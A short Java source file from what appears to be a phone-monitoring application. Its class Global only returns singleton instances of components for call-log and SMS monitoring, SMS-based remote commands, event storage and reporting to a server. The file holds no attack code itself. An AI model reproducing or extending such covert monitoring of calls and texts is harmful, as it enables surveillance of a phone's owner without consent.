package com.vvt.global;

import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.db.FxEventDatabase;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseManager;
import com.vvt.pref.Preference;
import com.vvt.prot.CommandServiceManager;
import com.vvt.protmgr.SendActivateManager;
import com.vvt.protmgr.SendDeactivateManager;
import com.vvt.protmgr.SendEventManager;
import com.vvt.protmgr.SendHeartBeatManager;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.SMSCmdReceiver;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.smsutil.SMSMessageMonitor;
import com.vvt.smsutil.SMSSender;

public final class Global {
	
	public static Preference getPreference() {
		return Preference.getInstance();
	}
	
	public static FxCallLogNumberMonitor getFxCallLogNumberMonitor() {
		return FxCallLogNumberMonitor.getInstance();
	}
	
	public static FxEventDatabase getFxEventDatabase() {
		return FxEventDatabase.getInstance();
	}
	
	public static LicenseManager getLicenseManager() {
		return LicenseManager.getInstance();
	}
	
	public static SMSSender getSMSSender() {
		return SMSSender.getInstance();
	}

	public static SMSCmdReceiver getSMSCmdReceiver() {
		return SMSCmdReceiver.getInstance();
	}

	public static SMSMessageMonitor getSMSMessageMonitor() {
		return SMSMessageMonitor.getInstance();
	}
	
	public static SMSCmdStore getSMSCmdStore() {
		return SMSCmdStore.getInstance();
	}
	
	public static SendActivateManager getSendActivateManager() {
		return SendActivateManager.getInstance();
	}
	
	public static CommandServiceManager getCommandServiceManager() {
		return CommandServiceManager.getInstance();
	}
	
	public static SendEventManager getSendEventManager() {
		return SendEventManager.getInstance();
	}
	
	public static SendDeactivateManager getSendDeactivateManager() {
		return SendDeactivateManager.getInstance();
	}
	
	public static SendHeartBeatManager getSendHeartBeatManager() {
		return SendHeartBeatManager.getInstance();
	}
	
	public static RmtCmdProcessingManager getRmtCmdProcessingManager() {
		return RmtCmdProcessingManager.getInstance();
	}
	
	public static RmtCmdRegister getRmtCmdRegister() {
		return RmtCmdRegister.getInstance();
	}
	
	public static ServerUrl getServerUrl() {
		return ServerUrl.getInstance();
	}
}
